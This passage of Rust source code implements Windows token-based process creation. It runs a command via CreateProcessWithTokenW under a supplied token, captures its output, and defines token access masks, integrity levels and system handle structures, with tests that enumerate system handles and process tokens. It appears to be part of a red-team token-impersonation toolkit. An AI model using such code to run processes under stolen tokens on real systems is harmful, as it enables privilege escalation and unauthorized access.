        return Err(Error::new(
            ErrorKind::Other,
            format!("NtCreateNamedPipeFile failed: {:#X}", status),
        ));
    }

    // Ensure the read handle is not inheritable by the child process
    if unsafe { nt_set_handle_information(child_stdout_read, HANDLE_FLAG_INHERIT, 0).ok() }
        .is_none()
    {
        return Err(Error::last_os_error());
    }

    // // Configure the STARTUPINFO structure for the child process
    let mut si: StartupInfoW = StartupInfoW::new();
    si.cb = core::mem::size_of::<StartupInfoW>() as u32;
    si.dw_flags = STARTF_USESTDHANDLES;
    si.h_std_output = child_stdout_write;
    si.h_std_error = child_stdout_write;

    // Create process information struct
    let mut pi: ProcessInformation = ProcessInformation::new();

    // Convert the command line to a wide string (UTF-16)
    let mut cmdline_utf16: Vec<u16> = cmd_line.encode_utf16().chain(Some(0)).collect();

    let success = unsafe {
        (advapi32().create_process_with_token_w)(
            token,
            0,
            core::ptr::null(),
            cmdline_utf16.as_mut_ptr(),
            CREATE_UNICODE_ENVIRONMENT | CREATE_NO_WINDOW,
            null_mut(),
            core::ptr::null(),
            &mut si,
            &mut pi,
        ) != 0
    };

    if !success {
        // Capture the error if process creation fails
        unsafe { ntdll().nt_close.run(child_stdout_read) };
        unsafe { ntdll().nt_close.run(child_stdout_write) };
        return Err(Error::new(
            ErrorKind::Other,
            format!("CreateProcessWithTokenW failed: {}", Error::last_os_error()),
        ));
    }

    _print!("[+] Creating process via 'CreateProcessWithTokenW'");

    // Close the write end of the pipe as the parent won't write to it
    unsafe { ntdll().nt_close.run(child_stdout_write) };

    // Buffer to store the output from the child process
    let mut output = String::new();
    let mut buffer = [0u8; 1024];

    // Read the process's output until the stream is closed
    loop {
        let mut io_status_block_read: IoStatusBlock = IoStatusBlock::new();

        let ok = ntdll().nt_read_file.run(
            child_stdout_read,
            null_mut(),
            null_mut(),
            null_mut(),
            &mut io_status_block_read,
            buffer.as_mut_ptr() as *mut c_void,
            buffer.len() as u32,
            null_mut(),
            null_mut(),
        );

        let bytes_read = io_status_block_read.information;

        if ok != 0 {
            // Break on pipe closure or other errors
            let err = nt_get_last_error();
            if err == 109 {
                break; // ERROR_BROKEN_PIPE indicates the process has finished writing
            }
            break;
        }
        if bytes_read == 0 {
            break;
        }

        // Append the read bytes to the output string
        output.push_str(&String::from_utf8_lossy(&buffer[..bytes_read as usize]));
    }

    // Wait for the child process to exit
    unsafe {
        ntdll()
            .nt_wait_for_single_object
            .run(pi.h_process, false, null_mut())
    };

    // Close remaining handles associated with the child process
    unsafe { ntdll().nt_close.run(child_stdout_read) };
    unsafe { ntdll().nt_close.run(pi.h_process) };
    unsafe { ntdll().nt_close.run(pi.h_thread) };

    // Return the captured output
    Ok(output)
}

/// Modifies attributes of a specified handle using the NtSetInformationObject API.
///
/// This function retrieves the current attributes of the handle, updates them based on the
/// provided `mask` and `flags`, and applies the changes.
///
/// # Parameters
/// - `handle`: A handle to the object whose attributes are being modified.
/// - `mask`: Specifies which attributes to modify (e.g., `HANDLE_FLAG_INHERIT` or `HANDLE_FLAG_PROTECT_FROM_CLOSE`).
/// - `flags`: Specifies the new values for the attributes in the mask.
///
/// # Returns
/// - `Ok(())` on success.
/// - `Err(std::io::Error)` if the operation fails.
///
/// # Notes
/// - This function internally uses `NtQueryObject` and `NtSetInformationObject` to retrieve and update handle attributes.
/// - The caller must ensure the provided handle is valid.
pub unsafe fn nt_set_handle_information(
    handle: *mut c_void,
    mask: u32,
    flags: u32,
) -> Result<(), std::io::Error> {
    // Query the current handle information
    let mut handle_info = ObjectHandleAttributeInformation::default();
    let mut bytes_returned: u32 = 0;

    let status = ntdll().nt_query_object.run(
        handle,
        ObjectInformationClass::ObjectHandleFlagInformation as u32,
        &mut handle_info as *mut _ as *mut c_void,
        core::mem::size_of::<ObjectHandleAttributeInformation>() as u32,
        &mut bytes_returned,
    );

    if !NT_SUCCESS(status) {
        return Err(std::io::Error::new(
            std::io::ErrorKind::Other,
            format!("NtQueryObject failed: {:#X}", status),
        ));
    }

    // Modify the handle attributes based on the provided mask and flags
    if mask & HANDLE_FLAG_INHERIT != 0 {
        handle_info.inherit = (flags & HANDLE_FLAG_INHERIT) != 0;
    }
    if mask & HANDLE_FLAG_PROTECT_FROM_CLOSE != 0 {
        handle_info.protect_from_close = (flags & HANDLE_FLAG_PROTECT_FROM_CLOSE) != 0;
    }

    // Set the updated handle attributes
    let status = ntdll().nt_set_information_object.run(
        handle,
        ObjectInformationClass::ObjectHandleFlagInformation as u32,
        &mut handle_info as *mut _ as *mut c_void,
        core::mem::size_of::<ObjectHandleAttributeInformation>() as u32,
    );

    if !NT_SUCCESS(status) {
        return Err(std::io::Error::new(
            std::io::ErrorKind::Other,
            format!("NtSetInformationObject failed: {:#X}", status),
        ));
    }

    Ok(())
}

pub const HANDLE_FLAG_INHERIT: u32 = 0x00000001;
pub const TOKEN_ASSIGN_PRIMARY: u32 = 0x0001;
pub const TOKEN_DUPLICATE: u32 = 0x0002;
pub const TOKEN_IMPERSONATE: u32 = 0x0004;
pub const TOKEN_QUERY: u32 = 0x0008;
pub const TOKEN_ADJUST_PRIVILEGES: u32 = 0x0020;
pub const TOKEN_ADJUST_DEFAULT: u32 = 0x0080;
pub const TOKEN_ADJUST_SESSIONID: u32 = 0x0100;
pub const TOKEN_ELEVATION: u32 = TOKEN_QUERY
    | TOKEN_ASSIGN_PRIMARY
    | TOKEN_DUPLICATE
    | TOKEN_IMPERSONATE
    | TOKEN_ADJUST_PRIVILEGES
    | TOKEN_ADJUST_DEFAULT
    | TOKEN_ADJUST_SESSIONID;

#[repr(C)]
#[derive(Default)]
pub struct ObjectHandleAttributeInformation {
    pub inherit: bool,
    pub protect_from_close: bool,
}

pub enum ObjectInformationClass {
    ObjectHandleFlagInformation = 4,
}

pub const HANDLE_FLAG_PROTECT_FROM_CLOSE: u32 = 0x00000002;

#[repr(C)]
#[derive(Copy, Clone, Default)]
pub struct SecurityQualityOfService {
    pub length: u32,
    pub impersonation_level: u32,
    pub context_tracking_mode: u8,
    pub effective_only: u8,
}

#[repr(u32)]
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum IntegrityLevel {
    Untrusted = 0,
    LowIntegrity = 0x00001000,
    MediumIntegrity = 0x00002000,
    MediumHighIntegrity = 0x00002000 + 0x100, // MediumIntegrity + 0x100
    HighIntegrity = 0x00003000,
    SystemIntegrity = 0x00004000,
    ProtectedProcess = 0x00005000,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum SecurityImpersonationLevel {
    Anonymous = 0,
    Identification = 1,
    Impersonation = 2,
    Delegation = 3,
}

#[repr(u32)]
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum TokenElevationType {
    Default = 1,
    Full = 2,
    Limited = 3,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum TokenType {
    Primary = 1,
    Impersonation = 2,
}

#[repr(C)]
pub struct TokenUser {
    pub user: SidAndAttributes,
}

#[repr(C)]
pub struct SidAndAttributes {
    pub sid: *mut c_void,
    pub attributes: u32,
}

#[repr(C)]
pub struct TokenGroups {
    pub group_count: u32,
    pub groups: [SidAndAttributes; 1],
}

#[repr(C)]
pub struct TokenMandatoryLabel {
    label: SidAndAttributes,
}

#[repr(C)]
pub struct SystemHandleTableEntryInfoEx {
    object: *mut c_void,
    unique_process_id: usize,
    handle_value: usize,
    granted_access: u32,
    creator_back_trace_index: u16,
    object_type_index: u16,
    handle_attributes: u32,
    reserved: u32,
}

#[repr(C)]
pub struct SystemHandleInformationEx {
    number_of_handles: usize,
    reserved: usize,
    handles: [SystemHandleTableEntryInfoEx; 1],
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_list_system_handles() {
        let handles = list_system_handles();

        assert!(
            !handles.is_empty(),
            "The list of system handles should not be empty"
        );

        println!("[+] Retrieved {} handles", handles.len());
        for (_, handle) in handles.iter().enumerate() {
            println!(
                "[+] PID = {}, Handle = 0x{:X}, Access = 0x{:X}",
                handle.unique_process_id, handle.handle_value, handle.granted_access
            );
        }

        println!("[+] Test for list_system_handles passed successfully.");
    }

    #[test]
    #[cfg(feature = "verbose")]
    fn test_list_process_token() {
        list_process_tokens(None, |token| {
            println!("{}", token);
            true
        });

        println!("[+] Test for list_process_token passed successfully.");
    }
}
